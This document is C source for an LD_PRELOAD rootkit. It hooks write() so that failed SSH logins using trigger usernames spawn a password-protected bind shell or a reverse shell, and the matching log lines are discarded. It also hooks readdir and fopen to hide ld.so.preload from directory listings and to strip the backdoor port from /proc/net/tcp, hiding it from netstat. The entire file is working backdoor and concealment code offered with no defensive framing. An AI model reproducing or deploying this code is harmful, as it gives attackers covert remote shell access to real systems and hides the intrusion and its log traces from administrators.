#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>


//bind-shell definitions
#define KEY_4 "notavaliduser4"
#define PASS "password" // password to enter backdoor
#define LOC_PORT 65065  // (LOC stands for local)


//reverse-shell definitions   (REM stands for remote)
#define KEY_R_4 "reverseshell4"
#define REM_HOST4 "localhost"
#define REM_PORT 443


//filename to hide
#define FILENAME "ld.so.preload"

//hex represenation of port to hide for /proc/net/tcp reads
#define KEY_PORT "FE29"




int ipv4_bind (void)
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOC_PORT); // we will use LOC_PORT to connect to backdoor 
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count = 0; count < 3; count++)
    {
        dup2(new_sockfd, count); 
    }

    // spawn root shell after tcp connection is established

    char input[30]; // enter password to access backdoor

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}




int ipv4_rev (void)
{
    const char* host = REM_HOST4; // IP of attacker machine to connect back to

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client)); 

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}


/**
 * Hooked write() function
 * 
 * sshd calls write() with buf containing ssh hostname as a substring. This occurs when logging
 * ssh attempt to auth.log .
 * Example entry added to auth.log: 
 * "Failed password for invalid user invaliduser"
 *
 * This allows us (the attacker) to use a trigger (hostname) for enabling the backdoor (reverse-shell)
 */
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); // declare function pointer to new_write()

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write"); // set new_write to point to the C stdlib write() 


    // looks for KEY_4 as a substring in buf

    // used for spawning bind ipv4 shell
    char *bind4 = strstr(buf, KEY_4);

    // used for spawning reverse ipv4 shell
    char *rev4 = strstr(buf, KEY_R_4);

    if (bind4 != NULL) // substring KEY_4 found in buf
    {
        // failed ssh attempt will try to write() to log file
        // we redirect the write to /dev/null (black hole/does nothing)
        // and then spawn an ipv4 bind shell
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }


    else if (rev4 != NULL) // substring KEY_R_4 found in buf
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else
    {
        result = new_write(fildes, buf, nbytes); // if trigger not activated, write() behaves as normal
    }

    return result; // to sshd daemon it seems like everything is normal
}




/**

Hooking readdir(DIR *dirp) to hide ld.so.preload from ls

 dirp is a pointer to directory entries (struct DIR) to be read
 
 The readdir() function returns a pointer to a dirent structure
       representing the next directory entry in the directory stream
       pointed to by dirp.  It returns NULL on reaching the end of the
       directory stream or if an error occurred.
*/

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    // iterate through directory entries
    // if we see ld.so.preload, then we break 
    while (dir = old_readdir(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}


struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp)
{
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *dir;

    while (dir = old_readdir64(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}



/**
* fopen64() is the same as fopen() but supports large files
*
* From the manpage: The fopen64() function is identical to the 
* fopen() function except that the underlying file descriptor is 
* created with the O_LARGEFILE flag set. The fopen64() function is a part of 
* the large-file extensions.
*
* The code for fopen() and fopen64() should be nearly identical.
*/
FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode)
{
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile64();
		fp = orig_fopen64(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}

	fp = orig_fopen64(pathname, mode);
	return fp;
}




/**
*
* Hooking fopen() to hide backdoor connection from netstat (and lsof)
*
* netstat reads tcp connection input from /proc/net/tcp
* When netstat calls open(/proc/net/tcp) we can return a modified file with
* our connection removed. We do this by parsing each line and if KEY_PORT is detected,
* we hide the line
*
* KEY_PORT is the port specified in the reverse shell
*
*/

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	orig_fopen = dlsym(RTLD_NEXT, "fopen");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT); 
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;

	}

	fp = orig_fopen(pathname, mode);
	return fp;
}